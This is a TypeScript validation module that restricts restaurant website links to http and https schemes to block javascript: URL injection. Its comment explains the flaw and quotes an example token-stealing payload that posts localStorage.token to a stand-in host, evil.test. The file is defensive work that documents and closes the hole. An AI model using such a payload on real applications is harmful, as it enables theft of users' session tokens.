import { z } from 'zod';

/**
 * Validation for user-supplied web links (currently a restaurant's ordering/website URL).
 *
 * WHY THIS EXISTS INSTEAD OF PLAIN `z.string().url()`:
 * Zod's `.url()` only asks whether the string parses as a URL — it does not care which
 * scheme it uses. `javascript:alert(1)`, `data:text/html,<script>...`, `vbscript:...` and
 * `file:///etc/passwd` are all *valid URLs* and all pass `.url()`. So before this, any
 * restaurant could store `javascript:fetch('https://evil.test/?t='+localStorage.token)` as
 * its "website", and every viewer's tap on the ordering link fed that string to
 * `Linking.openURL()`.
 *
 * Measured, not assumed: react-native-web's openURL ends in
 * `window.open(url, '_blank', 'noopener')`, and current Chromium refuses to execute a
 * `javascript:` URL opened that way — so this was NOT live XSS through that path. The same
 * payload *does* execute the moment it reaches an `<a href>`, which was verified directly.
 * That makes the old behavior a loaded gun pointed at a browser mitigation we don't own:
 * rendering this link as a real anchor (semantically correct, and an accessibility
 * improvement someone will reasonably make) or opening it in an embedded webview turns it
 * into working token theft, with no code change here to warn anyone.
 *
 * An allowlist of exactly the two schemes a website link can legitimately use closes that
 * whole class rather than blacklisting the dangerous names we happen to think of today.
 */
const ALLOWED_PROTOCOLS = new Set(['http:', 'https:']);

export function isSafeWebUrl(value: string): boolean {
  let parsed: URL;
  try {
    parsed = new URL(value);
  } catch {
    return false;
  }
  // `URL` normalizes the scheme to lowercase and strips embedded tab/newline characters
  // before parsing, so obfuscations like `JavaScript:` and `java\tscript:` are both
  // already collapsed to `javascript:` by the time we read `.protocol`.
  return ALLOWED_PROTOCOLS.has(parsed.protocol);
}

/** A website URL, or '' to clear it. Only http(s) — see the note above. */
export const webUrlSchema = z.union([
  z
    .string()
    .max(300)
    .refine(isSafeWebUrl, { message: 'Enter a valid website starting with http:// or https://' }),
  z.literal(''),
]);
